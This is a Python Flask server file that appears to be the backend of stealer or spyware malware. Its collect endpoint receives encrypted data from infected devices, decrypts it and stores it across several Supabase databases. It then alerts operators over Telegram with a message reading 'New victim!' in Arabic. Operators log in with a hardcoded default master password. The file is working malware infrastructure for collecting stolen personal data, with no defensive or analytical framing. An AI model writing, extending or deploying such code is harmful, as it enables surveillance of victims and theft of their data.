import os
import json
import base64
import logging
import requests
from flask import Flask, request, jsonify, render_template_string
from supabase import create_client
from server.core.security_shield import SecurityShield

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD', 'Zaen123@123@')
master_secret_b64 = os.environ.get('MASTER_SECRET_B64')
salt = os.environ.get('SALT', 'default_salt')

if not master_secret_b64:
    raise ValueError("MASTER_SECRET_B64 is required")

master_secret = base64.b64decode(master_secret_b64)
shield = SecurityShield(master_secret, salt.encode())

authenticated_admins = set()

def send_to_all_supabase(decrypted_data):
    for i in range(1, 5):
        url = os.environ.get(f'SUPABASE_URL_{i}')
        key = os.environ.get(f'SUPABASE_KEY_{i}')
        if url and key:
            try:
                client = create_client(url, key)
                client.table('client_info').upsert(decrypted_data).execute()
            except Exception as e:
                logger.error(f"Supabase {i} Error: {e}")

def notify_admins(message):
    for i in range(1, 11):
        token = os.environ.get(f'TELEGRAM_TOKEN_{i}')
        if token:
            for admin_id in authenticated_admins:
                try:
                    url = f"https://api.telegram.org/bot{token}/sendMessage"
                    requests.post(url, json={'chat_id': admin_id, 'text': message}, timeout=5)
                except:
                    continue

@app.route('/telegram/webhook', methods=['POST'])
def telegram_webhook():
    update = request.get_json()
    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        text = update["message"].get("text", "")
        if text == MASTER_PASSWORD:
            authenticated_admins.add(chat_id)
            return jsonify({"status": "ok", "message": "مدير مفعل"}), 200
    return jsonify({"status": "ignored"}), 200

@app.route('/api/v1/collect', methods=['POST'])
def collect_data():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        encrypted_payload = data.get('payload')
        decrypted_dict = shield.process_incoming_data(encrypted_payload, device_id)
        decrypted_dict['device_id'] = device_id
        send_to_all_supabase(decrypted_dict)
        msg = f"🔔 ضحية جديد!\n📱 الجهاز: {decrypted_dict.get('model')}\n🆔 ID: {device_id}"
        notify_admins(msg)
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"error": "failed"}), 500

@app.route('/dashboard')
def dashboard():
    pwd = request.args.get('password')
    if pwd != MASTER_PASSWORD:
        return "<h1>Access Denied</h1>", 403
    return "<h1>لوحة التحكم - جلب البيانات</h1>"

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "healthy"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
